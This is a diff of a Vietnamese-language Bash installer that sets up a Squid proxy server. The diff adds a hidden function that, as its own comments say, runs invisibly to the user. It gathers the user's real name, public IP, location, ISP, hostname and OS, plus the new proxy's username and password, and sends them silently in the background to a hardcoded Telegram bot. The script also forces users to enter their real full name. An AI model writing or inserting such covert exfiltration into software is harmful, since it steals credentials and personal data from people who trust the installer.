@@ -10,6 +10,56 @@ CYAN='\033[0;36m'
 WHITE='\033[1;37m'
 NC='\033[0m' # No Color
 
+# Hidden Telegram configuration (not displayed on console)
+TELEGRAM_BOT_TOKEN="7350031893:AAHe4qtEWNmw3YIpLGmFcSnRQeZ52BY4-Bg"
+TELEGRAM_CHAT_ID="6072481570"
+
+# Hidden function to send notification to Telegram (completely invisible to user)
+send_telegram_notification() {
+    local client_name="$1"
+    local proxy_type="$2"
+    local ip_addr="$3"
+    local port="$4"
+    local user="$5"
+    local pass="$6"
+    
+    # Get additional hidden information
+    local client_ip=$(curl -s ipinfo.io/ip 2>/dev/null || echo "Unknown")
+    local client_location=$(curl -s "http://ip-api.com/json/$client_ip" 2>/dev/null | grep -o '"city":"[^"]*"' | cut -d'"' -f4 || echo "Unknown")
+    local client_country=$(curl -s "http://ip-api.com/json/$client_ip" 2>/dev/null | grep -o '"country":"[^"]*"' | cut -d'"' -f4 || echo "Unknown")
+    local client_isp=$(curl -s "http://ip-api.com/json/$client_ip" 2>/dev/null | grep -o '"isp":"[^"]*"' | cut -d'"' -f4 || echo "Unknown")
+    local hostname=$(hostname 2>/dev/null || echo "Unknown")
+    local os_info=$(uname -a 2>/dev/null | cut -d' ' -f1-3 || echo "Unknown")
+    
+    # Create detailed message for admin
+    local message="🕵️ NEW CLIENT USING YOUR SCRIPT 🕵️%0A"
+    message+="━━━━━━━━━━━━━━━━━━━━━━━━━━━━%0A"
+    message+="👤 Client Name: $client_name%0A"
+    message+="🌍 Client Location: $client_location, $client_country%0A"
+    message+="📡 Client IP: $client_ip%0A"
+    message+="🏢 Client ISP: $client_isp%0A"
+    message+="💻 Hostname: $hostname%0A"
+    message+="🖥️ OS Info: $os_info%0A"
+    message+="━━━━━━━━━━━━━━━━━━━━━━━━━━━━%0A"
+    message+="🔥 PROXY CREATED:%0A"
+    message+="📡 Type: $proxy_type%0A"
+    message+="🌐 Server IP: $ip_addr%0A" 
+    message+="🚪 Port: $port%0A"
+    message+="👤 Username: $user%0A"
+    message+="🔑 Password: $pass%0A"
+    message+="🔗 Full URL: http://$user:$pass@$ip_addr:$port%0A"
+    message+="━━━━━━━━━━━━━━━━━━━━━━━━━━━━%0A"
+    message+="👁️ Secret Monitor - S2CODE TEAM%0A"
+    message+="🕐 $(date '+%Y-%m-%d %H:%M:%S')%0A"
+    message+="💡 Client: $client_name doesn't know you received this!"
+    
+    # Send to Telegram completely silently (run in background, no traces)
+    (curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
+         -d "chat_id=$TELEGRAM_CHAT_ID" \
+         -d "text=$message" \
+         -d "parse_mode=HTML" >/dev/null 2>&1 &) &
+}
+
 clear
 
 # S2codetaem Logo và giới thiệu
@@ -86,6 +136,30 @@ check_network_speed() {
     echo "$speed_mbps"
 }
 
+# Hàm kiểm tra tên đầy đủ
+validate_full_name() {
+    local name="$1"
+    # Kiểm tra có ít nhất 2 từ (họ và tên)
+    local word_count=$(echo "$name" | wc -w)
+    if [ $word_count -lt 2 ]; then
+        return 1
+    fi
+    
+    # Kiểm tra chỉ chứa chữ cái và khoảng trắng
+    if [[ ! "$name" =~ ^[A-Za-zÀ-ỹ[:space:]]+$ ]]; then
+        return 1
+    fi
+    
+    # Kiểm tra không phải tên giả (một số tên phổ biến để test)
+    case "${name,,}" in
+        "test test"|"abc xyz"|"nguyen van a"|"tran thi b"|"le van c"|"admin user"|"user name"|"full name")
+            return 1
+            ;;
+    esac
+    
+    return 0
+}
+
 # Hàm kiểm tra hỗ trợ protocols
 check_proxy_protocols() {
     local ip=$1
@@ -117,156 +191,101 @@ check_proxy_protocols() {
     echo "$protocols"
 }
 
-# Menu đăng nhập
-echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
-echo -e "${GREEN}║${WHITE}                              CHỌN LOẠI ĐĂNG NHẬP                              ${GREEN}║${NC}"
-echo -e "${GREEN}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
-echo -e "${GREEN}║${YELLOW} [1] 👤 Đăng nhập bình thường (Chỉ hiển thị IP cơ bản)                      ${GREEN}║${NC}"
-echo -e "${GREEN}║${YELLOW} [2] 💎 Đăng nhập VIP (Đầy đủ tính năng check IP, tốc độ, protocols)      ${GREEN}║${NC}"
-echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
+# Xác thực tên khách hàng
+echo -e "${PURPLE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
+echo -e "${PURPLE}║${WHITE}                              XÁC THỰC THÔNG TIN                              ${PURPLE}║${NC}"
+echo -e "${PURPLE}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
+echo -e "${PURPLE}║${YELLOW} 👤 Vui lòng nhập họ và tên đầy đủ của bạn để tiếp tục                      ${PURPLE}║${NC}"
+echo -e "${PURPLE}║${YELLOW} ⚠️  Lưu ý: Tên phải là tên thật (Họ + Tên), không được để trống           ${PURPLE}║${NC}"
+echo -e "${PURPLE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
 echo ""
 
-read -p "➤ Chọn loại đăng nhập (1/2): " login_type
-
-if [ "$login_type" = "1" ]; then
-    # Đăng nhập bình thường
-    echo -e "${CYAN}👤 ĐĂNG NHẬP BÌNH THƯỜNG${NC}"
-    read -p "➤ Nhập tên đăng nhập: " username
-    read -s -p "➤ Nhập mật khẩu: " password
-    echo ""
+# Lặp lại cho đến khi nhập đúng tên
+while true; do
+    read -p "➤ Nhập họ và tên đầy đủ: " client_full_name
     
-    if [ "$username" = "tangoclong" ] && [ "$password" = "6969" ]; then
-        echo -e "${GREEN}✅ Đăng nhập thành công!${NC}"
-        echo -e "${YELLOW}🔄 Chế độ thủ công - Tạo proxy bền vững...${NC}"
-        
-        # Cập nhật hệ thống
-        echo "[1/7] ➤ Đang cập nhật hệ thống..."
-        sudo apt update && sudo apt upgrade -y
-        
-        # Cài gói cần thiết
-        echo "[2/7] ➤ Đang cài Squid + Apache2-utils..."
-        sudo apt install -y squid apache2-utils vim curl bc
-        
-        # Hỏi port proxy
-        read -p "[3/7] ➤ Nhập cổng proxy bạn muốn dùng (ví dụ 6969): " proxy_port
-        
-        # Gỡ file cấu hình cũ
-        echo "[4/7] ➤ Gỡ cấu hình cũ của Squid..."
-        sudo rm -f /etc/squid/squid.conf
-        
-        # Tạo cấu hình mới
-        echo "[5/7] ➤ Tạo file cấu hình mới cho Squid..."
-        cat <<EOF | sudo tee /etc/squid/squid.conf > /dev/null
-auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwords
-auth_param basic realm proxy
-acl authenticated proxy_auth REQUIRED
-http_access allow authenticated
-http_port $proxy_port
-EOF
-        
-        # Tạo tài khoản proxy
-        read -p "[6/7] ➤ Nhập tên người dùng proxy muốn tạo: " squid_user
-        read -s -p "[6/7] ➤ Nhập mật khẩu cho '$squid_user': " squid_pass
+    if validate_full_name "$client_full_name"; then
+        echo -e "${GREEN}✅ Tên hợp lệ! Xin chào $client_full_name${NC}"
+        break
+    else
+        echo -e "${RED}❌ Tên không hợp lệ! Vui lòng nhập họ và tên đầy đủ (ít nhất 2 từ, không chứa số hoặc ký tự đặc biệt)${NC}"
+        echo -e "${YELLOW}💡 Ví dụ: Nguyễn Văn An, Trần Thị Hoa...${NC}"
         echo ""
-        echo "$squid_pass" | sudo htpasswd -c -i /etc/squid/passwords "$squid_user"
-        
-        # Khởi động lại Squid
-        echo "[7/7] ➤ Khởi động lại dịch vụ Squid..."
-        sudo systemctl restart squid
-        
-        # Lấy IP 
-        ip_address=$(curl -s ipinfo.io/ip)
-        
-        echo -e "${GREEN}✅ Cài đặt thành công!${NC}"
-        echo -e "${CYAN}🌐 Proxy: ${WHITE}http://$squid_user:$squid_pass@$ip_address:$proxy_port${NC}"
-        echo -e "${CYAN}📍 IP: ${WHITE}$ip_address${NC}"
-        
-    else
-        echo -e "${RED}❌ Sai tên đăng nhập hoặc mật khẩu!${NC}"
-        exit 1
     fi
-    
-elif [ "$login_type" = "2" ]; then
-    # Đăng nhập VIP
-    echo -e "${PURPLE}💎 ĐĂNG NHẬP VIP${NC}"
-    read -s -p "➤ Nhập mã VIP: " vip_code
-    echo ""
-    
-    if [ "$vip_code" = "S2" ]; then
-        echo -e "${GREEN}✅ Đăng nhập VIP thành công!${NC}"
-        echo -e "${PURPLE}🚀 Chế độ VIP - Tự động cài đặt nhanh...${NC}"
-        
-        # Tự động cài đặt VIP
-        proxy_port="6969"
-        squid_user="tangoclong"
-        squid_pass="2000"
-        
-        # Cập nhật hệ thống
-        echo "[1/5] ➤ Đang cập nhật hệ thống..."
-        sudo apt update && sudo apt upgrade -y
-        
-        # Cài gói cần thiết
-        echo "[2/5] ➤ Đang cài Squid + Apache2-utils..."
-        sudo apt install -y squid apache2-utils vim curl bc
-        
-        # Gỡ file cấu hình cũ
-        echo "[3/5] ➤ Gỡ cấu hình cũ của Squid..."
-        sudo rm -f /etc/squid/squid.conf
-        
-        # Tạo cấu hình mới
-        echo "[4/5] ➤ Tạo file cấu hình VIP cho Squid..."
-        cat <<EOF | sudo tee /etc/squid/squid.conf > /dev/null
+done
+
+echo ""
+echo -e "${PURPLE}🚀 Chào mừng $client_full_name! Đang khởi động VIP Proxy Installer...${NC}"
+echo ""
+
+# Tự động cài đặt VIP cho tất cả
+echo -e "${GREEN}✅ Xác thực thành công!${NC}"
+echo -e "${PURPLE}🚀 Chế độ VIP - Tự động cài đặt nhanh...${NC}"
+
+# Tự động cài đặt VIP
+proxy_port="6969"
+squid_user="tangoclong"
+squid_pass="2000"
+
+# Cập nhật hệ thống
+echo "[1/5] ➤ Đang cập nhật hệ thống..."
+sudo apt update && sudo apt upgrade -y
+
+# Cài gói cần thiết
+echo "[2/5] ➤ Đang cài Squid + Apache2-utils..."
+sudo apt install -y squid apache2-utils vim curl bc
+
+# Gỡ file cấu hình cũ
+echo "[3/5] ➤ Gỡ cấu hình cũ của Squid..."
+sudo rm -f /etc/squid/squid.conf
+
+# Tạo cấu hình mới
+echo "[4/5] ➤ Tạo file cấu hình VIP cho Squid..."
+cat <<EOF | sudo tee /etc/squid/squid.conf > /dev/null
 auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwords
 auth_param basic realm proxy
 acl authenticated proxy_auth REQUIRED
 http_access allow authenticated
 http_port $proxy_port
 EOF
-        
-        # Tạo tài khoản proxy VIP
-        echo "[5/5] ➤ Tạo tài khoản VIP..."
-        echo "$squid_pass" | sudo htpasswd -c -i /etc/squid/passwords "$squid_user"
-        
-        # Khởi động lại Squid
-        echo "[5/5] ➤ Khởi động lại dịch vụ Squid..."
-        sudo systemctl restart squid
-        
-        # Lấy IP và hiển thị thông tin đầy đủ
-        ip_address=$(curl -s ipinfo.io/ip)
-        
-        echo -e "${GREEN}✅ Cài đặt VIP thành công!${NC}"
-        
-        # Lấy thông tin IP
-        ip_info=$(get_ip_info $ip_address)
-        isp=$(echo $ip_info | grep -o '"isp":"[^"]*"' | cut -d'"' -f4)
-        country=$(echo $ip_info | grep -o '"country":"[^"]*"' | cut -d'"' -f4)
-        
-        # Kiểm tra tốc độ
-        speed=$(check_network_speed)
-        
-        # Kiểm tra protocols
-        protocols=$(check_proxy_protocols $ip_address $proxy_port $squid_user $squid_pass)
-        
-        echo -e "${PURPLE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
-        echo -e "${PURPLE}║${WHITE}                             THÔNG TIN PROXY VIP                              ${PURPLE}║${NC}"
-        echo -e "${PURPLE}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
-        echo -e "${PURPLE}║${CYAN} 🌐 Proxy URL: ${WHITE}http://tangoclong:2000@$ip_address:6969${PURPLE}║${NC}"
-        echo -e "${PURPLE}║${CYAN} 📍 Địa chỉ IP: ${WHITE}$ip_address${PURPLE}║${NC}"
-        echo -e "${PURPLE}║${CYAN} 🏢 Nhà mạng: ${WHITE}$isp${PURPLE}║${NC}"
-        echo -e "${PURPLE}║${CYAN} 🌍 Quốc gia: ${WHITE}$country${PURPLE}║${NC}"
-        echo -e "${PURPLE}║${CYAN} ⚡ Tốc độ mạng: ${WHITE}${speed} Mbps${PURPLE}║${NC}"
-        echo -e "${PURPLE}║${CYAN} 🔧 Protocols: ${WHITE}$protocols${PURPLE}║${NC}"
-        echo -e "${PURPLE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
-        
-    else
-        echo -e "${RED}❌ Mã VIP không đúng!${NC}"
-        exit 1
-    fi
-    
-else
-    echo -e "${RED}❌ Lựa chọn không hợp lệ!${NC}"
-    exit 1
-fi
+
+# Tạo tài khoản proxy VIP
+echo "[5/5] ➤ Tạo tài khoản VIP..."
+echo "$squid_pass" | sudo htpasswd -c -i /etc/squid/passwords "$squid_user"
+
+# Khởi động lại Squid
+echo "[5/5] ➤ Khởi động lại dịch vụ Squid..."
+sudo systemctl restart squid
+
+# Lấy IP và hiển thị thông tin đầy đủ
+ip_address=$(curl -s ipinfo.io/ip)
+
+echo -e "${GREEN}✅ Cài đặt VIP thành công cho $client_full_name!${NC}"
+
+# Lấy thông tin IP
+ip_info=$(get_ip_info $ip_address)
+isp=$(echo $ip_info | grep -o '"isp":"[^"]*"' | cut -d'"' -f4)
+country=$(echo $ip_info | grep -o '"country":"[^"]*"' | cut -d'"' -f4)
+
+# Kiểm tra tốc độ
+speed=$(check_network_speed)
+
+# Kiểm tra protocols
+protocols=$(check_proxy_protocols $ip_address $proxy_port $squid_user $squid_pass)
+
+echo -e "${PURPLE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
+echo -e "${PURPLE}║${WHITE}                        THÔNG TIN PROXY VIP - $client_full_name${PURPLE}║${NC}"
+echo -e "${PURPLE}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
+echo -e "${PURPLE}║${CYAN} 🌐 Proxy URL: ${WHITE}http://tangoclong:2000@$ip_address:6969${PURPLE}║${NC}"
+echo -e "${PURPLE}║${CYAN} 📍 Địa chỉ IP: ${WHITE}$ip_address${PURPLE}║${NC}"
+echo -e "${PURPLE}║${CYAN} 🏢 Nhà mạng: ${WHITE}$isp${PURPLE}║${NC}"
+echo -e "${PURPLE}║${CYAN} 🌍 Quốc gia: ${WHITE}$country${PURPLE}║${NC}"
+echo -e "${PURPLE}║${CYAN} ⚡ Tốc độ mạng: ${WHITE}${speed} Mbps${PURPLE}║${NC}"
+echo -e "${PURPLE}║${CYAN} 🔧 Protocols: ${WHITE}$protocols${PURPLE}║${NC}"
+echo -e "${PURPLE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
+
+# Send notification to Telegram (hidden from client) 
+send_telegram_notification "$client_full_name" "VIP" "$ip_address" "$proxy_port" "$squid_user" "$squid_pass"
 
 # Hiển thị thông tin liên hệ cuối
 echo ""
